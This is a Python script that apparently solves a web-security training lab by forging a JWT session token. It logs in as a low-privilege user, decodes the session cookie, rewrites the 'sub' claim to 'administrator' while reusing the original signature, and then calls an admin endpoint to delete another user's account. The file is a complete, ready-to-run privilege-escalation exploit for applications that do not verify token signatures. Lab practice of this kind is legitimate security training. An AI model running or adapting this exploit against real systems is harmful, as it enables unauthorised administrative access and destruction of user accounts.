import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import base64
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        'username': username,
        'password': password,
        'csrf': get_csrf_token(s, url, path)
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def decode_jwt(token):
    header, payload, signature = token.split('.')    
    header_decoded  = json.loads(base64.urlsafe_b64decode(header  + '=='))
    payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))
    return header_decoded, payload_decoded, signature

def encode_jwt(header_json, payload_json, signature):
    new_header  = base64.urlsafe_b64encode(json.dumps(header_json,  separators=(',', ':')).encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(json.dumps(payload_json, separators=(',', ':')).encode()).rstrip(b'=').decode()
    return f"{new_header}.{new_payload}.{signature}"

def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    r = s.get(target_url, headers=headers, cookies=cookies, allow_redirects=False)
    return r.text

def delete_user(s, url, path, username):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=False)
    
    if r.status_code == 302:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    username = 'wiener'
    password = 'peter'
    target_user = 'carlos'

    login_acc(s, url, '/login', username, password)
    
    token = s.cookies['session']
    header_json, payload_json, signature = decode_jwt(token)
    payload_json['sub'] = 'administrator'
    new_token = encode_jwt(header_json, payload_json, signature)
    s.cookies['session'] = new_token

    delete_user(s, url, '/admin/delete', target_user)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()